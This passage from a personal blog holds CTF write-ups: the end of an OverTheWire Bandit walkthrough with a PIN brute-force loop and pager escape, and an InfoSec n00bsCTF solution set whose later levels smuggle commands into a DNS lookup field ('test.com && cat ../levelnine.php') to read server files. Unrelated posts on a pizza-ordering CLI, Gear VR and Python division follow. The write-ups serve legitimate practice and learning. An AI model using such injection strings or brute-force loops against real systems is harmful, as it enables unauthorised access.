    <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">(netcat(</span><span style="color: #e6db74">&#39;localhost&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">30002</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">trypass)):</span>
        <span style="color: #66d9ef">break</span>
    <span style="color: #f8f8f2">count</span> <span style="color: #f92672">+=</span> <span style="color: #ae81ff">1</span>
</pre></div>
</p>

<p>Some time passes&hellip;..</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">no: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 5668
&#39;Correct!\nThe password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG\n\nExiting.\n&#39;
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 5669
bandit24@melinda:~$ 
</pre></div>
</p>

<h1 id="level-25-26:0e66a8a07761fc75a6c8722719cf3240">Level 25 -&gt; 26</h1>

<p><a href="http://overthewire.org/wargames/bandit/bandit26.html">Level 25</a></p>

<p>Ok, so first we need to see what happens when we log in as Bandit26</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">bandit25@melinda:~$ ssh -i bandit26.sshkey bandit26@localhost
  _                     _ _ _   ___   __  
 | |                   | (_) | |__ \ / /  
 | |__   __ _ _ __   __| |_| |_   ) / /_  
 | &#39;_ \ / _` | &#39;_ \ / _` | | __| / / &#39;_ \ 
 | |_) | (_| | | | | (_| | | |_ / /| (_) |
 |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/ 
Connection to localhost closed.
</pre></div>
</p>

<p>Hrm&hellip; ok, let&rsquo;s check the shell bandit26 uses:</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">bandit25@melinda:/home/bandit25$ cat /etc/passwd <span style="color: #f8f8f2">|</span> grep bandit26
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
bandit25@melinda:/home/bandit25$ cat /usr/bin/showtext
#!/bin/sh

more ~/text.txt
exit 0
</pre></div>
</p>

<p>Interesting. So we need to break out of <code>more</code> somehow. With <code>more</code> we
can go into interactive mode if we can figure out how to pause it.
We can do that by limiting how much it can output to the screen.
The ASCII art above is about 8 lines, let&rsquo;s resize the terminal to 5 lines
or something, and when it pauses, hit &lsquo;v&rsquo; to open an editor.</p>

<p>Once in the editor simply open <code>/etc/bandit_pass/bandit26</code> and the password
is: <code>5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z</code></p>

<p>And that&rsquo;s the last password in the list, and thus the end of the game.</p>

<p>It was good fun and had a nice incrementing level of difficulty</p>

<p>Hope you had as much fun as me playing this. Next time we&rsquo;ll tackle <code>Leviathan</code>.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2015/03/11/infosec-n00bsctf/">
        Solving Infosec n00bsCTF
      </a>
    </h1>

    <span class="post-date">Wed, Mar 11, 2015</span>

    

<p>The InfoSec Institue is running a <a href="http://ctf.infosecinstitute.com/index.php">n00bsCTF</a>,
and I can&rsquo;t resist a CTF really. Plus this will be a nice warmup for Hackyeaster 2015.
So let&rsquo;s jump on it and get some flags&hellip;</p>

<p>I haven&rsquo;t managed to get all of them, but I will be updating this post when
I manage to solve some of the others.</p>

<h2 id="level-01:aad69195db02279e47989643f4843312">Level 01</h2>

<p><a href="http://ctf.infosecinstitute.com/levelone.php">http://ctf.infosecinstitute.com/levelone.php</a></p>


<figure >
    
        <img src="http://i.imgur.com/ebnLRwp.png" />
    
    
</figure>


<p>May the source be with you, eh? Sounds to me like someone wants us to look at the
page source. Right click, select <code>view page source</code> and&hellip;</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">&lt;!-- infosec_flagis_welcome --&gt;</span>
<span style="color: #75715e">&lt;!DOCTYPE html&gt;</span>
<span style="color: #f92672">&lt;html</span> <span style="color: #a6e22e">lang=</span><span style="color: #e6db74">&quot;en&quot;</span><span style="color: #f92672">&gt;</span>
  <span style="color: #f92672">&lt;head&gt;</span>
</pre></div>


<p>And there it is, right at the top.</p>

<pre><code>infosec_flagis_welcome
</code></pre>

<h2 id="level-02:aad69195db02279e47989643f4843312">Level 02</h2>

<p><a href="http://ctf.infosecinstitute.com/leveltwo.php">http://ctf.infosecinstitute.com/leveltwo.php</a></p>


<figure >
    
        <img src="http://i.imgur.com/TVGZFKU.png" />
    
    
</figure>


<p>A broken image you say? Let&rsquo;s download it and have a look. We notice it&rsquo;s very small,
only 45 bytes. So let&rsquo;s open it in a hex editor and examine its contents. I opened
it in vim (to use it as a hex editor enter <code>:!xxd</code>),
and was instantly greeted with this string. Didn&rsquo;t even have to convert it to hex.</p>

<pre><code>aW5mb3NlY19mbGFnaXNfd2VhcmVqdXN0c3RhcnRpbmc=
</code></pre>

<p>Base64 encoded text. Let&rsquo;s run it through a decoder and see what we get&hellip;.</p>

<pre><code>infosec_flagis_wearejuststarting
</code></pre>

<p>Level02&rsquo;s flag done.</p>

<h2 id="level-03:aad69195db02279e47989643f4843312">Level 03</h2>

<p><a href="http://ctf.infosecinstitute.com/levelthree.php">http://ctf.infosecinstitute.com/levelthree.php</a></p>


<figure >
    
        <img src="http://i.imgur.com/lL8OkTO.png" />
    
    
</figure>


<p>We are presented with a QR code. So I grabbed my phone, scanned it, and was presented
with a series of dots and dashes. Morse code no doubt. Being lazy I didn&rsquo;t want to type
it into a decoder manually,
so I used <a href="http://zxing.org/w/decode.jspx">this tool</a> to decode the QR code
and then copy/pasted the output into a <a href="http://www.onlineconversion.com/morse_code.htm">morse code translator</a>
and ended up with:</p>

<pre><code>INFOSECFLAGISMORSING
</code></pre>

<h2 id="level-04:aad69195db02279e47989643f4843312">Level 04</h2>

<p><a href="http://ctf.infosecinstitute.com/levelfour.php">http://ctf.infosecinstitute.com/levelfour.php</a></p>


<figure >
    
        <img src="http://i.imgur.com/yFiSrus.png" />
    
    
</figure>


<p>A picture and a tidbit of information. Hrmm&hellip; Ok, not much to go with here. Mousing
over the image pops up a dialog. Investigating that didn&rsquo;t lead me anywhere. Time
to get the thinking hats on and think about what info we have here that might be
relevant. Because everything we need to solve this level is somewhere here.
Of course the biggest clue is the picture: Cookie Monster. Right, let&rsquo;s check the cookie
cache. Only one cookie by infosecinstitute. It&rsquo;s garbage! Or is it perhaps just a
caesar cipher? Each letter is shifted by a certain amount, and we need to figure out
that amount. Due to the number of characters and _ in the string, it looks like it.</p>

<p>Knowing the format of previous flags we can figure out how much to shift by.</p>

<p>So <code>vasbfrp_syntvf_jrybirpbbxvrf</code> should be <code>infosec_flag_xxxxxxx</code>. Knowing this
we can work out the shift. Simple write out the alphabet once and
then, write the letters we know below.</p>

<pre><code>abcdefghijklmnopqrstuvwxyz
n                 f   i
</code></pre>

<p>That&rsquo;s enough for us to fill in the rest of the alphabet.
Then transpose and solve the final part to get:</p>

<pre><code>infosec_flag_welovecookies
</code></pre>

<p>Flag has been nommed.</p>

<h2 id="level-05:aad69195db02279e47989643f4843312">Level 05</h2>

<p><a href="http://ctf.infosecinstitute.com/levelfive.php">http://ctf.infosecinstitute.com/levelfive.php</a></p>

<p>A pesky popup saying I&rsquo;m a hacker? What an accusation. Well, let&rsquo;s top it from
popping up and get ourselves a script blocker to see what else there might be.
Once done, we examine the source and see it&rsquo;s loading an image too.</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #f92672">&lt;img</span> <span style="color: #a6e22e">src=</span><span style="color: #e6db74">&quot;img/aliens.jpg&quot;</span> <span style="color: #f92672">/&gt;</span> <span style="color: #f92672">&lt;br</span> <span style="color: #f92672">/&gt;</span> <span style="color: #f92672">&lt;br</span> <span style="color: #f92672">/&gt;</span>
</pre></div>



<figure >
    
        <img src="http://i.imgur.com/JwFtmSw.png" />
    
    
</figure>


<p>Let&rsquo;s load up that image, or even better, let&rsquo;s just browse to <code>http://ctf.infosecinstitute.com/img/</code>
(Since writing directory listing has been disabled for this path).
Nothing particularily odd about the image. Let&rsquo;s try seeing if there&rsquo;s anything hidden in
it by way of steganography. I loaded up the image into <a href="http://www.futureboy.us/stegano/decinput.html">this site</a>
and sure enough, selecting a type of <code>text/plain</code> we get a stream of 1s and 0s. Binary data.
Let&rsquo;s try to convert that to a string and see what, if anything, it says. Using any
binary to text decoder on the internet, we are given the flag:</p>

<pre><code>infosec_flagis_stegaliens
</code></pre>

<p>Gotcha</p>

<h2 id="level-06:aad69195db02279e47989643f4843312">Level 06</h2>

<p><a href="http://ctf.infosecinstitute.com/levelsix.php">http://ctf.infosecinstitute.com/levelsix.php</a></p>


<figure >
    
        <img src="http://i.imgur.com/w81ZV0N.png" />
    
    
</figure>


<p>At first I was a bit lost, but when you stare at a lot of data, it&rsquo;s easy to be overwhelmed.
Especially when you don&rsquo;t know really what you are looking for. I decided to give it another go
and have located the flag. It&rsquo;s actually in the very first packet. The hex string for <em>infosec_flag</em>
is starting to look very familiar now. It appears as the data of the first packet:</p>


<figure >
    
        <img src="http://i.imgur.com/aO8ojXG.png" />
    
    
</figure>


<p>Enter the string with <code>696e66...</code> into a hex to string converter and you get</p>

<pre><code>infosec_flagis_sniffed
</code></pre>

<p>Sniffed right out.</p>

<h2 id="level-07:aad69195db02279e47989643f4843312">Level 07</h2>

<p><a href="http://ctf.infosecinstitute.com/404.php">http://ctf.infosecinstitute.com/404.php</a></p>


<figure >
    
        <img src="http://i.imgur.com/PZu5CIK.png" />
    
    
</figure>


<p>We get an error saying <em>f00 not found</em> and the URL reads 404.php. Going by the other URLs
I would assume we actually need <code>levelseven.php</code>, so let&rsquo;s enter that and see what we get.
It seems to return an empty page. That&rsquo;s not much use, but it&rsquo;s better than a real
404. Because there&rsquo;s no error and no content, we must be getting back a 200 status (all OK).
Perhaps there&rsquo;s something else to look at too?</p>

<p>In this case let&rsquo;s examine what&rsquo;s going back and forth between us and the server.
You can either fire up a proxy like <a href="https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project">ZAP</a>
or use a request inspection plugin for Firefox like <a href="https://addons.mozilla.org/en-US/firefox/addon/httprequester/">httpRequester</a>.</p>

<p>So let&rsquo;s send off a GET request for <code>levelseven.php</code> and see what we get back.</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">HTTP/1.0 200 aW5mb3NlY19mbGFnaXNfeW91Zm91bmRpdA==
Date: Thu, 12 Mar 2015 09:26:48 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.6
Content-Length: 0
Connection: close
Content-Type: text/html
</pre></div>


<p>Heh, very nice. We have a 200 response with, what is clearly a base64 encoded string.
Copypasta that into a decoder and let&rsquo;s see what we get:</p>

<pre><code>infosec_flagis_youfoundit
</code></pre>

<p>Yes, I did find it.</p>

<h2 id="level-08:aad69195db02279e47989643f4843312">Level 08</h2>

<p><a href="http://ctf.infosecinstitute.com/leveleight.php">http://ctf.infosecinstitute.com/leveleight.php</a></p>


<figure >
    
        <img src="http://i.imgur.com/OSKPz0g.png" />
    
    
</figure>


<p>Ok, let&rsquo;s download <code>app.exe</code> and give this a go. It&rsquo;s a wrapper around <code>netstat</code> that
just shows you what your current connections are. It takes no arguments, so there&rsquo;s
not anyway to attack this thing with overflows. And this being a n00bs level CTF, it&rsquo;s
unlikely we&rsquo;ll be thrown this kind of exploit development.
So the other thing we can do is check its strings.</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">strings app.exe
</pre></div>


<p>Sure enough, there&rsquo;s <code>infosec_flagis_0x1a</code>. At first I was reluctant to go with this, as
it&rsquo;s a bit too simple, so I looked a bit further. I dumped the source with <code>objdump</code></p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">objdump -s app.exe | less
</pre></div>


<p>And I found <code>infosec_flagis_0x1a</code> in it. It sits at <code>0x403000</code>, so let&rsquo;s run this
through <code>gdb</code> too.</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">$&gt; gdb app.exe
gdb$ disass main
Dump of assembler code for function main:
   0x00401290 &lt;+0&gt;:	push   %ebp
   0x00401291 &lt;+1&gt;:	mov    %esp,%ebp
   0x00401293 &lt;+3&gt;:	sub    $0x18,%esp
   0x00401296 &lt;+6&gt;:	and    $0xfffffff0,%esp
   0x00401299 &lt;+9&gt;:	mov    $0x0,%eax
   0x0040129e &lt;+14&gt;:	add    $0xf,%eax
   0x004012a1 &lt;+17&gt;:	add    $0xf,%eax
   0x004012a4 &lt;+20&gt;:	shr    $0x4,%eax
   0x004012a7 &lt;+23&gt;:	shl    $0x4,%eax
   0x004012aa &lt;+26&gt;:	mov    %eax,-0x8(%ebp)
   0x004012ad &lt;+29&gt;:	mov    -0x8(%ebp),%eax
   0x004012b0 &lt;+32&gt;:	call   0x401740 &lt;_alloca&gt;
   0x004012b5 &lt;+37&gt;:	call   0x4013e0 &lt;__main&gt;
   0x004012ba &lt;+42&gt;:	mov    $0x403000,%eax       &lt;------ aha oho
   0x004012bf &lt;+47&gt;:	mov    %al,-0x1(%ebp)
   0x004012c2 &lt;+50&gt;:	movl   $0x403014,(%esp)
   0x004012c9 &lt;+57&gt;:	call   0x401850 &lt;printf&gt;
   0x004012ce &lt;+62&gt;:	movl   $0x403044,(%esp)
   0x004012d5 &lt;+69&gt;:	call   0x401850 &lt;printf&gt;
   0x004012da &lt;+74&gt;:	movl   $0x403014,(%esp)
   0x004012e1 &lt;+81&gt;:	call   0x401850 &lt;printf&gt;
   0x004012e6 &lt;+86&gt;:	movl   $0x403072,(%esp)
   0x004012ed &lt;+93&gt;:	call   0x401840 &lt;system&gt;
   0x004012f2 &lt;+98&gt;:	call   0x4017c0 &lt;getch&gt;
   0x004012f7 &lt;+103&gt;:	mov    $0x0,%eax
   0x004012fc &lt;+108&gt;:	leave  
   0x004012fd &lt;+109&gt;:	ret
   0x004012fe &lt;+110&gt;:	nop
   0x004012ff &lt;+111&gt;:	nop
End of assembler dump
</pre></div>


<p>There we see a fimilar address. Checking its contents</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">gdb$ x/s 0x403000
0x403000:	 &quot;infosec_flagis_0x1a&quot;
</pre></div>


<p>There&rsquo;s nothing that would indicate that this string changes, so for now, I&rsquo;m
going to say the flag is:</p>

<pre><code>infosec_flagis_0x1a
</code></pre>

<p>Leave a comment below to correct me if I am wrong though, I&rsquo;d really appreciate that.</p>

<h2 id="level-09:aad69195db02279e47989643f4843312">Level 09</h2>

<p><a href="http://ctf.infosecinstitute.com/levelnine.php">http://ctf.infosecinstitute.com/levelnine.php</a></p>


<figure >
    
        <img src="http://i.imgur.com/5XnlOL9.png" />
    
    
</figure>


<p>Initially I struggled with this. I tried the usual default passwords without success.
Attacked it with SQL injections, nothing. Then I had a brainwave. Because I already had level15,
I could just look at the <code>levelnine.php</code> file. So I did. Issue <code>test.com &amp;&amp; cat ../levelnine.php</code>
and at the end we see what happens if we get the flag:</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #a6e22e">alert</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&#39;ssaptluafed_sigalf_cesofni&#39;</span><span style="color: #f8f8f2">)</span><span style="color: #960050; background-color: #1e0010">&quot;</span><span style="color: #f8f8f2">;</span>
    <span style="color: #f8f8f2">}</span>
</pre></div>


<p>It&rsquo;s the flag reversed, so let&rsquo;s flip it to get:</p>

<pre><code>infosec_flagis_defaultpass
</code></pre>

<p>ti tog yllaniF</p>

<p>PS: What&rsquo;s even cuter is if you run <code>test.com &amp;&amp; tac ../levelnine.php</code>. You actually
get the popup. <code>tac</code> does the same as <code>cat</code>, but reverses the lines in the output.
The reason this works is because it will encounter the javascript pop up code before
the conditional that checks the input.</p>

<p>It also prints out the username and password for us:
<div class="highlight" style="background: #272822"><pre style="line-height: 125%">?&gt; } echo &quot;&quot;; if ($username == &#39;root&#39; and $password == &#39;attack&#39;) { 
    $password = $_POST[&#39;password&#39;]; 
    $username = $_POST[&#39;username&#39;];
</pre></div>
</p>

<p>Now you can go to the levelnine url and enter that to get the flag. Either way should
be valid, as the aim of the game is to get the flag. It shouldn&rsquo;t matter how you get it :)</p>

<p>Level15 has been a huge help in all of this!</p>

<h2 id="level-10:aad69195db02279e47989643f4843312">Level 10</h2>

<p><a href="http://ctf.infosecinstitute.com/levelten.php">http://ctf.infosecinstitute.com/levelten.php</a></p>


<figure >
    
        <img src="http://i.imgur.com/QENqipl.png" />
    
    
</figure>


<p>Let&rsquo;s listen to the sound. Hrmm Squeaky. Could be anything. Maybe some weirdly pitched morse.
But let&rsquo;s download and open it in Audacity. My initial hunch is that it&rsquo;s sped up, due
to the highpitched sound. So I started reducing the playback speed, and it turns out that
at around 0.15 times the original speed, we hear someone talking. He&rsquo;s actually telling us
the name of the flag</p>

<pre><code>infosec_flagis_sound
</code></pre>

<p>Thanks kind stranger</p>

<h2 id="level-11:aad69195db02279e47989643f4843312">Level 11</h2>

<p><a href="http://ctf.infosecinstitute.com/leveleleven.php">http://ctf.infosecinstitute.com/leveleleven.php</a></p>


<figure >
    
        <img src="http://i.imgur.com/L2tFy5t.png" />
    
    
</figure>


<p>Hrmm.. there&rsquo;s no sound this time, instead we get the PHP logo. Well, it&rsquo;s all
we have so let&rsquo;s open it up. I loaded it into vim, changed to hex mode (:%!xxd)
and right at the top we have</p>

<pre><code>infosec_flagis_aHR0cDovL3d3dy5yb2xsZXJza2kuY28udWsvaW1hZ2VzYi9wb3dlcnNsaWRlX2xvZ29fbGFyZ2UuZ2lm
</code></pre>

<p>Yeah, that won&rsquo;t be it will it? We&rsquo;re very familiar with base64 now aren&rsquo;t we? Ok, decode</p>

<pre><code>http://www.rollerski.co.uk/imagesb/powerslide_logo_large.gif
</code></pre>

<p>Open it up and we get an image. Because the domain is outside of the control of
this CTF, we can assume that the image hasn&rsquo;t been tampered with or anything
is embedded in it and that the actual flag is:</p>

<pre><code>infosec_flagis_powerslide
</code></pre>

<p>I&rsquo;ll take it, thanks!</p>

<h2 id="level-12:aad69195db02279e47989643f4843312">Level 12</h2>

<p><a href="http://ctf.infosecinstitute.com/leveltwelve.php">http://ctf.infosecinstitute.com/leveltwelve.php</a></p>


<figure >
    
        <img src="http://i.imgur.com/WdLl96v.png" />
    
    
</figure>


<p>Ok we recognise this image. We had it in level 1 and we had to look at the source.
Our clue is dig deeper and that could mean a number of things. Let&rsquo;s try some directory
traversal by appending a slash and some random text at the end. Hrm, we just
get a list of the levels and no css. Ok, that&rsquo;s not it. Let&rsquo;s dig into the source again.
There&rsquo;s nothing obvious, but I reckon it might be one of the files included in the source.
It would make sense given the clue we&rsquo;ve been given.</p>

<p>To cut a long story short, there&rsquo;s a css file <code>design.css</code> that&rsquo;s not included
in the other pages. I know this because I&rsquo;ve pretty much looked at the source for each
level. Force of habit. Anyway, let&rsquo;s take a look at it:</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #a6e22e">.thisloveis</span><span style="color: #f8f8f2">{</span>
	<span style="color: #66d9ef">color</span><span style="color: #f92672">:</span> <span style="color: #ae81ff">#696e666</span><span style="color: #f8f8f2">f7365635f666c616769735f686579696d6e6f7461636f6c6f72;</span>
<span style="color: #f8f8f2">}</span>
</pre></div>


<p>Aha, that&rsquo;s not a valid colour is it? It&rsquo;s also not base64. Looks like hex values
to me. Run it through a hex to text converter and&hellip;..</p>

<pre><code>infosec_flagis_heyimnotacolor
</code></pre>

<p>Yeah, you weren&rsquo;t a colour, that&rsquo;s for sure.</p>

<h2 id="level-13:aad69195db02279e47989643f4843312">Level 13</h2>

<p><a href="http://ctf.infosecinstitute.com/levelthirteen.php">http://ctf.infosecinstitute.com/levelthirteen.php</a></p>

<p>
<figure >
    
        <img src="http://i.imgur.com/JX3Je1g.png" />
    
    
</figure>
</p>

<p>Ok, this was a bit of a cheat, because I skipped to level 15 and now I have a a few more
tools available. I ran <code>test.com &amp;&amp; ls -la ..</code> and voila, there&rsquo;s the backup file:
<code>levelthirteen.php.old</code>. Much easier than guessing, right?
Looking at this file we see it will prompt us to download a file called <code>misc/imadecoy</code>.
This seems to be a network capture involving a project called <a href="https://github.com/shipcod3/honeypy">HoneyPy</a>.</p>

<p>I opened it up in wireshark and spent quite a bit of time on it. There&rsquo;s really nothing
interesting in it for the most part. However near the end we get a PNG image called
<code>HoneyPY.PNG</code>. For some reason this just stood out to me. I took a chance and exported it
by rightclicking the packet and selecting <code>Export Selected Packet Bytes</code> as shown</p>

<p>
<figure >
    
        <img src="http://i.imgur.com/jhH2v19.png" />
    
    
</figure>
</p>

<p>Opening this image surprises us with a flag! W00t! That flag is:</p>

<pre><code>infosec_flagis_morepackets
</code></pre>

<p>A wireshark level I managed to do. Yay</p>

<h2 id="level-14:aad69195db02279e47989643f4843312">Level 14</h2>

<p><a href="http://ctf.infosecinstitute.com/levelfourteen.php">http://ctf.infosecinstitute.com/levelfourteen.php</a></p>

<p>
<figure >
    
        <img src="http://i.imgur.com/0akB0Ni.png" />
    
    
</figure>
</p>

<p>UPDATE: The <code>level14.db</code> file has been removed and the <code>misc</code> directory can
no longer be listed. Use the second method below to solve this level</p>

<p>Once downloaded we get a database backup file. This one was quite interesting because
there are two places where the flag is. So first I looked at what else is in the
<code>misc</code> directory where this file lives. There&rsquo;s a <code>level14.db</code> file. Let&rsquo;s
take a look at that.</p>

<p>It adds an entry to the flag db. It&rsquo;s a hex string, so like above, simply decode it and
get</p>

<pre><code>infosec_flagis_whatsorceryisthis
</code></pre>

<p>But, look at the <code>level14</code> file again. Scroll through and notice that in the
<code>friends</code> table there&rsquo;s a fimilar entry. Decoding that will also give you the flag.</p>

<h2 id="level-15:aad69195db02279e47989643f4843312">Level 15</h2>

<p><a href="http://ctf.infosecinstitute.com/levelfifteen/index.php">http://ctf.infosecinstitute.com/levelfifteen/index.php</a></p>

<p>
<figure >
    
        <img src="http://i.imgur.com/EVJuDmC.png" />
    
    
</figure>
</p>

<p>So here we can lookup a dns entry by typing a domain in the text field. So let&rsquo;s try
that and see what we get. I used <code>test.com</code> and as a result I get the output
from the <code>dig</code> command. Interesting. It could be that the php script is merely
calling <code>dig</code> with the search term appended to it. This is a bad way to execute
a command, and we will see why. In Linux you can append a command to another using <code>&amp;&amp;</code>.
So let&rsquo;s try listing the directory with <code>test.com&amp;&amp;ls</code> as our search query. Sure enough,
we see <code>index.php</code> at the bottom of the output. Well, perhaps there&rsquo;s some hidden files so
let&rsquo;s run <code>test.com &amp;&amp; ls -la</code>. Aha, there&rsquo;s a file called <code>.hey</code>, let&rsquo;s cat that with
<code>test.com &amp;&amp; cat .hey</code> and we get <code>Miux+mT6Kkcx+IhyMjTFnxT6KjAa+i6ZLibC</code></p>

<p>Not sure however where to go from here. The ZlibC at the end of the string might
be a clue.</p>

<p>Please leave any comments with ideas on this. I&rsquo;m a bit stumped.</p>

<p>UPDATE: Turns out it&rsquo;s Atom 128 adn you can use <a href="http://crypo.in.ua/tools/eng_atom128c.php">this site</a>
to decode it to <code>infosec_flagis_rceatomized</code></p>

<p>Thanks to Anon and @fr1t3 for the info</p>

<p>ALL FLAGS DONE</p>

<h2 id="the-lost-level:aad69195db02279e47989643f4843312">The lost level</h2>

<p>UPDATED: This has since been removed, but I&rsquo;ve left this here for posterity.</p>

<p>Not sure where this belongs, but in the misc folder is a file called <code>readme.wav</code>
which contains the morsecode for</p>

<pre><code>INFOSECFLAGISMORSECODETONES
</code></pre>

<p>Which level this belongs to, I don&rsquo;t know.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2015/03/04/cli-pizza/">
        CLI Pizza
      </a>
    </h1>

    <span class="post-date">Wed, Mar 4, 2015</span>

    <p>Recently someone was talking about ordering Pizza from within
<a href="http://sidefx.com">Houdini</a>. I figured that it must be possible somehow.
I looked for an API and only found a US based, possibly out of date,
<a href="https://www.npmjs.com/package/dominos">API for Dominos</a> written in node.js.
However I needed one that worked with the UK version of the Dominos site.
So I began working on deconstructing the URLs that the Dominos site uses to get
menus, place orders and such, and started building a Python API around that.</p>

<p>So far I&rsquo;ve got a few features working and am happy with the progress. Here&rsquo;s
a little video of how it works at this stage:</p>

<script type="text/javascript" src="https://asciinema.org/a/17295.js" id="asciicast-17295" async></script>

<p>Quite a bit to do still, but happy with the progress. I&rsquo;m planning to write up how
I figured out all the API calls in order to interact with their backend, so stay
tuned for that. Follow on <a href="https://www.titter.com/binaryheadache">Twitter</a> or
subscribe to the <a href="http://unlogic.co.uk/feed.xml">RSS</a>. The code will go up
on Github once it&rsquo;s more feature complete.</p>

<p>UPDATE: <a href="https://github.com/Svenito/dominos">it&rsquo;s on github</a></p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2015/02/10/why-i-think-gear-vr-is-the-way-forward/">
        Why I think Gear VR is the way forward
      </a>
    </h1>

    <span class="post-date">Tue, Feb 10, 2015</span>

    <p>Recently I&rsquo;ve been lucky enough to try out and work with the DK2 and the Samsung
GearVR, and while both do what they do really well, I much prefer my experience
with the GearVR. This isn&rsquo;t down to a technical advantage like improved
resolution, or the way it looks, it&rsquo;s about the experience. I&rsquo;ve strapped on the
DK2 more times that I can remember, and I&rsquo;ve set it up as many times too. I hate
setting it up. There&rsquo;s a plethora of cables. You have a USB cable for the headset
and one for the tracking camera. Then there&rsquo;s a cable to connect the
tracking camera to the headset line. Add a power supply and a HDMI lead and
you&rsquo;re now totalling 5 plugs you need to connect to set it up. Then you need
to configure the headset, making sure that the setting for the desktop are correct.
Some apps need direct to DK2, others need the dekstop extended, except when you
are on Windows 8, where it always needs to be extended. I&rsquo;ve managed to work
myself up just writing about it.</p>

<p>So enter the GearVR. The empty headset lands on my desk and I unpack it. It looks
like a something a strom trooper would strap to their face. It&rsquo;s light. Well, there&rsquo;s
no phone in it yet. We order a Samsung Note 4 and once it arrives I go about setting
it up and installing all the necessary software. The SD card that comes with the headset
contains all the required software to get you started and once the main software is
installed, you can install more via its built-in store/library. So I clip the phone into
the headset and put it on. It&rsquo;s still much lighter than the DK2, so I hope that the new
Rift will be a little bit lighter too. The interface is clean and easy to use. I haven&rsquo;t
got a gamepad, so I use the onboard swipe based controller and buttons to navigate.
It all works like a charm. But wait, there&rsquo;s something weird&hellip;. that&rsquo;s right, not
a single cable in sight. I can actually get up and walk around in it. Disclaimer:
that&rsquo;s a bad idea, stay put! I like the interface, it all seems very straightforward
and natural. The only issue I have is that my arm gets fatigued after a while of
having to hold it up to the side of the headset where the touchpad is. But I can
take it off and put it down without having to manage any cables, or worry about
getting caught up in a lead with my chair.</p>

<p>Basically I can unclip the front, insert the phone, put it on, and get going.
Once connected to the headset, the phone automatically launches the VR software,
and it only plays if you have the headset on (there&rsquo;s a sensor inside for that).
It&rsquo;s as easy as that. This to me is a big win over something like the Oculus. Sure
the Rift has the power of a high end gaming PC behind it, but I still prefer to
experience this new world of VR through the Samsung GearVR.</p>

<p>I&rsquo;ve deliberately skirted around resolution, content and the like because those
are variable and to me, the big difference that made the GearVR more enjoyable to
use was how easy it was to setup and the lack of cables. If you&rsquo;ve got a station
where you want to keep your VR setup, then the Rift will be a better choice, no
doubt. If however you want to play games, or watch movies whereever and whenever,
and not have to fiddle around with a mess of cables, then the GearVR is unbeatable.
And right now, the display quality on the GearVR beats the DK2 IMO. I imagine
that the next Rift will be on par though.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2015/01/23/python-expect-the-unexpected/">
        Python: expect the unexpected
      </a>
    </h1>

    <span class="post-date">Fri, Jan 23, 2015</span>

    

<p>I&rsquo;ve not really had much of a play with Python 3, but I&rsquo;m aware of some of its
differences. Yesterday I found out about a difference that took me by surprise.
Enough of a surprise that I felt the urge to write this post.</p>

<h1 id="opinion-divided:3294e7ffbfda40bfebd468b4c32cfa57">Opinion Divided</h1>

<p>What surprised me was how <code>/</code> has changed in Python 3. In Python 2.7 it returns
the result of the division of two numbers.</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #f92672">&gt;&gt;&gt;</span> <span style="color: #ae81ff">8</span><span style="color: #f92672">/</span><span style="color: #ae81ff">2</span>
<span style="color: #ae81ff">4</span>
<span style="color: #f92672">&gt;&gt;&gt;</span> <span style="color: #ae81ff">10</span><span style="color: #f92672">/</span><span style="color: #ae81ff">3</span>
<span style="color: #ae81ff">3</span>
</pre></div>


<p>Checks out to me. <code>10 / 3</code> is 3.3333, and because we are using integers in
the expression, we expect an integer as the result.
Change the input to floats (or at least one of the inputs)</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #f92672">&gt;&gt;&gt;</span> <span style="color: #ae81ff">10</span><span style="color: #f92672">/</span><span style="color: #ae81ff">3.0</span>
<span style="color: #ae81ff">3.3333333333333335</span>
</pre></div>


<p>and we get a float. Right, nothing weird there. Where it starts getting odd is
that in Python 3 you <strong>always</strong> get a float back, unless you use the <code>//</code> operator.
Apparently that is because too many people expected integer division to return a float.
Maybe it&rsquo;s just me and my fellow oldies who think that the original behaviour is
correct and integer division should yield an integer, not a float. Pretty much all
main stream languages behave like this. In C/C++ you need to cast one of the arguments
to a float to get a float back.</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include &lt;iostream&gt;</span>

<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">main</span> <span style="color: #f8f8f2">()</span> <span style="color: #f8f8f2">{</span>
